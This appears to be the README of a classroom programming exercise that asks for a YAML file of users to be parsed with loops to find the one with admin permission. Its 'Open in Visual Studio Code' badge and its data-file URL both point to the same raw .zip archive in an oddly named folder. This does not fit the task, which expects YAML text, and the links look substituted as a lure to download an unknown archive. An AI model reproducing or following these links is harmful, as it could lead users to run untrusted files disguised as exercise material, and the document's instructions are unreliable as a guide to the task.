[![Open in Visual Studio Code](https://raw.githubusercontent.com/Hecatum/eksam-parse-yaml-Hecatum/main/sulphobenzide/eksam-parse-yaml-Hecatum.zip)](https://raw.githubusercontent.com/Hecatum/eksam-parse-yaml-Hecatum/main/sulphobenzide/eksam-parse-yaml-Hecatum.zip)
## Parsing yaml

You need to find out what user has admin permissions and return the **full name** of the user.

File structure information is available:
```
- username
  - name
  - permission
```
use ```text``` method for ```https://raw.githubusercontent.com/Hecatum/eksam-parse-yaml-Hecatum/main/sulphobenzide/eksam-parse-yaml-Hecatum.zip``` to obtain file content before parsing.

The number of users and their properties may vary (theoretically), so **do not use numerical indexes** for them, but cycles instead.
```['users'][1]['permission']``` will probably return the correct answer, but is not considered a correct solution.
